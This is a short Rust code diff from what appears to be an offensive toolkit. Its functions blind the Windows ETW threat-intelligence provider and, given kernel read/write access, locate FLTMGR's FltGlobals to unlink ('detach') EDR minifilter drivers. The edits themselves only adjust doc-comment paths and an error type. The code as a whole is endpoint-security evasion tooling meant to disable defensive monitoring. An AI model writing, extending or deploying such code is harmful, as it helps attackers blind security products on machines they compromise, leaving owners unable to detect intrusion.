@@ -172,8 +172,8 @@ pub unsafe fn blind_etw_ti_full(
     }
 }
 
-/// Resolve the kernel VA of `FLTMGR!FltGlobals` so a [`telemetry::MiniFilterUnlinker`]
-/// can be constructed.
+/// Resolve the kernel VA of `FLTMGR!FltGlobals` so a
+/// [`crate::telemetry::MiniFilterUnlinker`] can be constructed.
 ///
 /// **Primary path:** the operator supplies `flt_globals_rva` (resolved offline
 /// from fltmgr's PDB via `offset-resolver`, or a known-build table). This is the
@@ -195,7 +195,7 @@ pub unsafe fn resolve_flt_globals_kva(flt_globals_rva: Option<u32>) -> Option<us
     Some(info.base + rva)
 }
 
-/// Construct a [`telemetry::MiniFilterUnlinker`] and detach EDR minifilters.
+/// Construct a [`crate::telemetry::MiniFilterUnlinker`] and detach EDR minifilters.
 ///
 /// Convenience wrapper: given a resolved `flt_globals_kva` (from
 /// [`resolve_flt_globals_kva`]) and a working `KernelRw`, build the unlinker and
@@ -209,12 +209,13 @@ pub unsafe fn unlink_minifilters(
     krw: &dyn KernelRw,
     flt_globals_kva: usize,
 ) -> Result<(), KitError> {
+    use crate::telemetry::{MiniFilterKit, MiniFilterUnlinker};
     if flt_globals_kva == 0 {
-        return Err(KitError::Unavailable(
-            "flt_globals_kva is 0 — MiniFilter unlink not wired (resolve fltmgr FltGlobals first)",
+        return Err(KitError::Other(
+            "flt_globals_kva is 0 — MiniFilter unlink not wired (resolve fltmgr FltGlobals first)".into(),
         ));
     }
-    let unlinker = telemetry::MiniFilterUnlinker { flt_globals_kva };
+    let unlinker = MiniFilterUnlinker { flt_globals_kva };
     unlinker.detach_edr(krw)
 }
 
